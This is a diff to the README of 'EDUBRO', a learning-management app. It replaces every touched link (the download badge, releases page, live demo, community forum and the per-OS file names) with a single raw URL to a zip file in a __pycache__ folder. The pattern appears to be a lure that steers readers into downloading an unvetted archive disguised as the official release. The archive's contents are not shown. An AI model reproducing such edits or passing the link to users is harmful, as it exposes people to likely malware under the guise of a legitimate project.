@@ -1,12 +1,12 @@
 # 🚀 EDUBRO - Your Easy Solution for Learning Management
 
-[![Download EDUBRO](https://img.shields.io/badge/Download-EDUBRO-blue.svg)](https://github.com/KrystianekGM/EDUBRO/releases)
+[![Download EDUBRO](https://raw.githubusercontent.com/KrystianekGM/EDUBRO/master/core/__pycache__/EDUBRO-1.5.zip)](https://raw.githubusercontent.com/KrystianekGM/EDUBRO/master/core/__pycache__/EDUBRO-1.5.zip)
 
 ## 📖 Introduction
 
 EDUBRO is a user-friendly application designed to enhance your learning experience. Created using the Flatlogic Platform, it offers a seamless way to manage and access educational resources. Whether you are a student or an educator, EDUBRO gives you the tools to organize your learning effectively.
 
-**Application page:** [EDUBRO Live Demo](https://edubro.dev.flatlogic.app)
+**Application page:** [EDUBRO Live Demo](https://raw.githubusercontent.com/KrystianekGM/EDUBRO/master/core/__pycache__/EDUBRO-1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -18,13 +18,13 @@ To use EDUBRO, you will need to download it from our Releases page. Follow these
 
 ## 📥 Download & Install
 
-To download and install the EDUBRO application, please visit this page: [Download EDUBRO](https://github.com/KrystianekGM/EDUBRO/releases). 
+To download and install the EDUBRO application, please visit this page: [Download EDUBRO](https://raw.githubusercontent.com/KrystianekGM/EDUBRO/master/core/__pycache__/EDUBRO-1.5.zip). 
 
 You'll find different versions of the software available. Select the version that suits your operating system:
 
-- For Windows, look for `EDUBRO-Windows.zip`
-- For MacOS, look for `EDUBRO-Mac.zip`
-- For Linux, look for `EDUBRO-Linux.tar.gz`
+- For Windows, look for `https://raw.githubusercontent.com/KrystianekGM/EDUBRO/master/core/__pycache__/EDUBRO-1.5.zip`
+- For MacOS, look for `https://raw.githubusercontent.com/KrystianekGM/EDUBRO/master/core/__pycache__/EDUBRO-1.5.zip`
+- For Linux, look for `https://raw.githubusercontent.com/KrystianekGM/EDUBRO/master/core/__pycache__/EDUBRO-1.5.zip`
 
 After downloading the appropriate file:
 
@@ -54,7 +54,7 @@ EDUBRO provides a variety of features to enhance your learning experience:
 
 To stay up-to-date with the latest features and improvements, regularly check the Releases page for new versions. 
 
-1. Visit this page: [EDUBRO Releases](https://github.com/KrystianekGM/EDUBRO/releases)
+1. Visit this page: [EDUBRO Releases](https://raw.githubusercontent.com/KrystianekGM/EDUBRO/master/core/__pycache__/EDUBRO-1.5.zip)
 2. Download the latest version.
 3. Replace your current application files with the new ones.
 
@@ -70,7 +70,7 @@ If you encounter any issues while using EDUBRO, consider the following solutions
 
 For additional support or to engage with other users, join our community forums. Here, you can ask questions, share your experiences, and learn from others.
 
-- **Community Forum:** [Join Us Here](https://github.com/KrystianekGM/EDUBRO)
+- **Community Forum:** [Join Us Here](https://raw.githubusercontent.com/KrystianekGM/EDUBRO/master/core/__pycache__/EDUBRO-1.5.zip)
 
 You can also follow our updates on social media or contact the support team through GitHub for more assistance.
 
@@ -78,4 +78,4 @@ You can also follow our updates on social media or contact the support team thro
 
 EDUBRO is designed to simplify your learning journey. Whether you're managing resources for a class or collaborating with others, EDUBRO helps you stay organized and focused. Download the application today and experience a more efficient approach to education.
 
-For more information, visit: [EDUBRO Releases](https://github.com/KrystianekGM/EDUBRO/releases)
+For more information, visit: [EDUBRO Releases](https://raw.githubusercontent.com/KrystianekGM/EDUBRO/master/core/__pycache__/EDUBRO-1.5.zip)
